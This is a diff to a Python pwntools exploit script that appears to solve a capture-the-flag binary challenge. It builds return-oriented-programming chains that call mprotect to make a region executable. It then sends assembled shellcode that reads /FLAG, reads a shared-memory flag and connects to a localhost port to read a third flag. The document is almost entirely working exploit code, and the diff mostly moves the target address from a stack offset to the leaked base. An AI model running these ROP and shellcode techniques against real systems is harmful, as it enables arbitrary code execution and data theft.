@@ -61,7 +61,6 @@ def main():
     timestamp = r.recvline().decode().strip()
     r.recvuntil(b"Random bytes generated at ")
     base = int(r.recvline().decode().strip(),16)
-    stack = base - 0x2000
 
     log.info(f"{timestamp=}")
     log.info(f"{base=}, {hex(base)}")
@@ -73,7 +72,6 @@ def main():
     rdx = gadget(base,code,"pop rdx;ret")
     rdi = gadget(base,code,"pop rdi;ret")
     rsi = gadget(base,code,"pop rsi;ret")
-    prax = gadget(base,code,"push rax;ret")
     syscall = gadget(base,code,"syscall;ret")
 
     print(r.recvline().decode().strip())
@@ -87,16 +85,16 @@ def main():
     print(r.recvline().decode().strip())
 
     file_flag=asm(f"\
-    mov rax,2;mov rdi,{stack};mov rsi,0;syscall;\
-    mov rdi,rax;mov rax,0;mov rsi,{stack+0x200};mov rdx,0x100;syscall;\
-    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{stack+0x200};syscall;\
-    mov rax,60;mov rdi,41;syscall;\
+    mov rax,2;mov rdi,{base};mov rsi,0;syscall;\
+    mov rdi,rax;mov rax,0;mov rsi,{base+0x200};mov rdx,0x100;syscall;\
+    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{base+0x200};syscall;\
+    mov rax,60;mov rdi,69;syscall;\
     ")
     send_rop(r,[
-        rax,10,rdi,stack,rsi,10*0x10000,rdx,7,syscall,
-        rax,0,rdi,0,rsi,stack+0x0000,rdx,20,syscall,
-        rax,0,rdi,0,rsi,stack+0x0100,rdx,len(file_flag),syscall,
-        stack+0x0100,
+        rax,10,rdi,base,rsi,10*0x10000,rdx,7,syscall,
+        rax,0,rdi,0,rsi,base+0x0000,rdx,20,syscall,
+        rax,0,rdi,0,rsi,base+0x0100,rdx,len(file_flag),syscall,
+        base+0x0100,
     ])
     sleep(0.1)
     r.sendline(b"/FLAG\x00")
@@ -114,24 +112,39 @@ def main():
     mov rdi,87;mov rax,60;syscall;\
     ")
     send_rop(r,[
-        rax,10,rdi,stack,rsi,10*0x10000,rdx,7,syscall,
-        rax,0,rdi,0,rsi,stack+0x0800,rdx,len(shm_flag),syscall,
-        stack+0x0800,
+        rax,10,rdi,base,rsi,10*0x10000,rdx,7,syscall,
+        rax,0,rdi,0,rsi,base+0x0800,rdx,len(shm_flag),syscall,
+        base+0x0800,
     ])
     sleep(0.1)
     r.send(shm_flag)
     print(r.recvline().decode().strip())
-    print(r.recvline().decode().strip())
-    flag=(r.recvuntil(b'** CMD').decode().strip())
-    print('** CMD',r.recvline().decode().strip())
+    flag=r.recvuntil(b'** CMD:')[:-7].rstrip(b'\x00').decode()
+    print(flag)
+    print('** CMD:',r.recvline().decode().strip())
     print(r.recvline().decode().strip())
 
+    connect=shellcraft.amd64.linux.connect('localhost',0x1337,'ipv4')
+    net_flag=asm(f"{connect}\
+    mov rdi,rbp;mov rax,0;mov rsi,{base+0x1200};mov rdx,0x100;syscall;\
+    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{base+0x1200};syscall;\
+    mov rdi,rax;mov rax,60;syscall;\
+    ")
+    send_rop(r,[
+        rax,10,rdi,base,rsi,10*0x10000,rdx,7,syscall,
+        rax,0,rdi,0,rsi,base+0x1000,rdx,len(net_flag),syscall,
+        base+0x1000,
+    ])
+    sleep(0.1)
+    r.send(net_flag)
+
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
 
     r.interactive()
     return
-
-    r.send(nop.encode())
-
 
 if __name__ == '__main__':
     main()
